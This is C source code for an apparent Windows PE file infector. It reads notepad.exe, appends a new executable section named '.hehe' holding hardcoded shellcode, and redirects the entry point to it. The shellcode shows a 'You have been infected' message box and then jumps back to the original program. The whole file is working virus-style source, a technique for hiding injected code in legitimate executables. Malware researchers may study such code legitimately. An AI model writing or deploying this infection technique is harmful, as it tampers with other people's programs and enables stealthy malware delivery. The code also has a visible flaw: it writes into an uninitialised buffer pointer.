#include <windows.h>
#include <string.h>
#include <stdio.h>

DWORD oldEPVA;
DWORD SectionAlignment;
DWORD FileAlignment;
DWORD oldImageSize;
unsigned char SHELLCODE[] ="\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x68\x6c\x6c\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55\x73\x65\x72\x54\xff\xd0\x68\x6f\x78\x41\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68\x58\x58\x58\x58\x68\x47\x45\x42\x4f\x68\x45\x53\x53\x41\x68\x4d\x59\x20\x4d\x89\xe7\x52\x68\x65\x64\x20\x21\x68\x66\x65\x63\x74\x68\x6e\x20\x69\x6e\x68\x20\x62\x65\x65\x68\x68\x61\x76\x65\x68\x59\x6f\x75\x20\x89\xe1\x52\x57\x51\x52\xff\xd0\x83\xc4\x10\xb8\x06\x20\x12\x04\xff\xe0";


DWORD shellcodeSize = sizeof(SHELLCODE);

DWORD align_up(DWORD value, DWORD alignment)
{
    return (((value + alignment - 1) / alignment) * alignment);
}

int main()
{
    char *path_buffer;
    if (!GetCurrentDirectoryA(0x100,path_buffer)) return 1;
    strcat(path_buffer,"\\notepad.exe");
    printf("EXECUTABLE PATH: %s\n", path_buffer);

    // open file and read to buffer
    FILE *file = fopen(path_buffer, "rb");
    fseek(file,0,SEEK_END);
    long file_size = ftell(file);
    rewind(file);
    LPVOID lpBaseAddress = malloc(file_size+10000);
    fread(lpBaseAddress,1,file_size,file);

    // check valid PE file
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)lpBaseAddress;
    if (dos_header->e_magic != 0x5A4D)
    {
        return 1;
    }
    PIMAGE_NT_HEADERS32 nt_header32 = (PIMAGE_NT_HEADERS32(((PBYTE)lpBaseAddress) + dos_header->e_lfanew));
    if (nt_header32->Signature != 0x4550)
    {
        return 1;
    }
    printf("\nVALID PE CONFIRMED !\n");
    

    // check if this file be infected with new section or not 
    PIMAGE_SECTION_HEADER sectionTableTest = IMAGE_FIRST_SECTION(nt_header32);
    BYTE infected_section_name[8];
    memcpy(infected_section_name,".hehe",5);
    for(int i = 0; i < nt_header32->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER section = &sectionTableTest[i];
        if (!memcmp(section->Name,infected_section_name,5)) return 1;
    }

    // save original EP for jump back
    oldEPVA = nt_header32->OptionalHeader.AddressOfEntryPoint + nt_header32->OptionalHeader.ImageBase;
    printf("Original virutal address of EP: %#x\n", oldEPVA);

    
    // adjust number of section
    DWORD oldNumberOfSection = nt_header32->FileHeader.NumberOfSections;
    nt_header32->FileHeader.NumberOfSections += 1;
    printf("New number of section: %#x\n", nt_header32->FileHeader.NumberOfSections);
    
    // get alignment value
    SectionAlignment = nt_header32->OptionalHeader.SectionAlignment;
    FileAlignment = nt_header32->OptionalHeader.FileAlignment;
    
    // get original image size
    oldImageSize = nt_header32->OptionalHeader.SizeOfImage;

    // expand the image size by one more section
    nt_header32->OptionalHeader.SizeOfImage = oldImageSize + SectionAlignment;
    printf("New image size: %#x\n", nt_header32->OptionalHeader.SizeOfImage);

    // Get the last section 
    PIMAGE_SECTION_HEADER sectionTable = IMAGE_FIRST_SECTION(nt_header32);
    PIMAGE_SECTION_HEADER lastSection = &sectionTable[oldNumberOfSection - 1];
    
    
    // set up for new section
    PIMAGE_SECTION_HEADER newSection = &sectionTable[oldNumberOfSection];
    DWORD newSectionVA = align_up(lastSection->VirtualAddress + lastSection->Misc.VirtualSize, SectionAlignment);
    DWORD newSectionVirtualSize = shellcodeSize;
    DWORD newSectionPointerToRawData = align_up(lastSection->PointerToRawData + lastSection->SizeOfRawData, FileAlignment);
    DWORD newSectionSizeOfRawData = align_up(newSectionVirtualSize, FileAlignment);

    // assign value for new section
    memcpy(newSection->Name, ".hehe", 5); // why memcpy work but not assign directly ?    
    newSection->Misc.VirtualSize = newSectionVirtualSize;//Physical Address/Virtual size;
    newSection->VirtualAddress = newSectionVA; // adjust
    newSection->SizeOfRawData = newSectionSizeOfRawData; // adjust
    newSection->PointerToRawData = newSectionPointerToRawData; // adjust
    newSection->PointerToRelocations = 0; // keep
    newSection->PointerToLinenumbers = 0; // keep
    newSection->NumberOfRelocations = 0; // keep
    newSection->NumberOfLinenumbers = 0; // keep
    newSection->Characteristics = 0x60000020; // include executable permission
    
    // overwrite entrypoint to shellcode
    for (int i = 0; i < shellcodeSize-4; i++)
    {
        if (SHELLCODE[i] == 0x06
            && SHELLCODE[i+1] == 0x20
            && SHELLCODE[i+2] == 0x12
            && SHELLCODE[i+3] == 0x04)
        {
            printf("place holder found !!\n");
            memcpy(&SHELLCODE[i],&oldEPVA,sizeof(oldEPVA));
        }
    }
    printf("\n\n");

    // copy shellcode to new section 
    memcpy((PBYTE)lpBaseAddress + newSectionPointerToRawData, SHELLCODE, shellcodeSize);
    
    // redirect program by changing EP to shellcode 
    nt_header32->OptionalHeader.AddressOfEntryPoint = newSection->VirtualAddress;
    
    // overwrite the program with modified version
    fclose(file);
    FILE *outFile = fopen(path_buffer,"wb");
    fwrite(lpBaseAddress,1,file_size+SectionAlignment,outFile);
    
    // free up memory and close file
    free(lpBaseAddress);
    fclose(outFile);
    printf("\nInfected successfully !\n");
    return 0;
}